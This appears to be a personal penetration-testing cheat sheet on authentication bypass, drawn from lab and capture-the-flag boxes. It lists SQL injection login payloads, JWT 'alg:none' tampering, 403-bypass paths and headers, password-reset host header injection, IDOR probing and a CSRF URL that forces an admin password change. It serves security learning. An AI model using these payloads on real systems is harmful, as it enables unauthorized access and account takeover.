# Authentication Bypass

See also: [[Web-Methodology]], [[SQL-Injection]]

## Default Credentials - Always Try First

```
admin:REDACTED
admin:REDACTED
admin:123456
root:REDACTED
root:REDACTED
guest:REDACTED
test:REDACTED
```

Google: `"[software name]" default credentials`

Check: https://www.cirt.net/passwords and https://default-password.info

## SQL Injection on Login

```
Username: admin' OR 1=1-- -
Password: anything
```

```
Username: admin'--
Password: anything
```

```
Username: ' OR 1=1-- -
Password: ' OR 1=1-- -
```

See [[SQL-Injection]] for more payloads.

## Parameter Manipulation

Intercept request in Burp and modify:

- `role=user` → `role=admin`
- `uid=5` → `uid=1`
- `admin=false` → `admin=true`
- `isAdmin=0` → `isAdmin=1`

## JWT Manipulation

```bash
# Decode JWT
echo "JWT_TOKEN" | cut -d'.' -f2 | base64 -d

# Change algorithm to "none" (alg:REDACTED attack)
# Modify payload (e.g., change user role)
# Re-encode and send without signature
```

For JWT cracking see [[Password-Attacks]].

## Forced Browsing

Try accessing admin pages directly:

```
/admin
/dashboard
/panel
/management
/administrator
/admin.php
/manager
```

## 403 Bypass Techniques

```
/admin → 403
/Admin → try
/ADMIN → try
/admin/ → try
/admin/. → try
/./admin → try
/admin..;/ → try (Tomcat)
/%2e/admin → try
```

Add headers:

```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## Password Reset Abuse

- Predictable reset tokens (timestamp-based, sequential)
- Host header injection: change `Host:` header to attacker domain - reset link sent with attacker URL
- Response manipulation: change `{"success":false}` to `{"success":true}` in Burp

## IDOR (Insecure Direct Object Reference)

```
/api/user/1001 → your profile
/api/user/1000 → someone else's profile (change ID)
/api/user/1 → possibly admin
```

Try sequential IDs, UUIDs if predictable, and encoded values.

## From Your Boxes

> **Tiki** (VHL) - Tiki Wiki CMS 21.1 authentication bypass CVE to wipe admin password
> - What worked: `python3 tiki.py TARGET` - exploit removes admin password, then login via Burp with empty password field
> - Lesson: CMS auth bypass CVEs often reset/wipe passwords rather than giving you a valid one - use Burp to send blank creds

> **DolphinV2** (VHL) - Boonex Dolphin 7.3.2 auth bypass + RCE chain
> - What worked: `python2 dolphin.py http://TARGET/` - bypasses auth and drops into PHP/shell prompt
> - Lesson: Check exploit-db for auth bypass CVEs on any CMS version you identify

> **Cockpit** (PG) - MySQL SQLi auth bypass on login form
> - What worked: `'OR '' = '` in the username field bypassed authentication to admin dashboard
> - Lesson: Always test for SQLi on login forms - even a simple `' OR 1=1 --` can work

> **Broker** (HTB) - ActiveMQ default credentials `admin:REDACTED`
> - What worked: `admin:REDACTED` on the basic auth prompt for ActiveMQ web console
> - Lesson: Always try default creds before anything else. Check vendor documentation for defaults

> **Multiple Boxes** - Default credential pattern across many boxes
> - Boxes where `admin:REDACTED` worked: Broker (HTB), Levram (PG), Hawat (PG), Peppo (PG), PayDay (PG), Extplorer (PG), Exfiltrated (PG), Kevin (PG/Win), AuthBy (PG/Win)
> - Lesson: Default creds are shockingly common. Always try `admin:REDACTED`, `admin:REDACTED`, `admin:REDACTED` on every login form

> **SecNotes** (HTB) - CSRF/XSRF to force admin password reset
> - What worked: Sent `http://TARGET/change_pass.php?password=password&confirm_password=password&submit=submit` via contact form to admin user
> - Lesson: If you can contact an admin AND the password reset accepts GET parameters, chain CSRF to take over their account
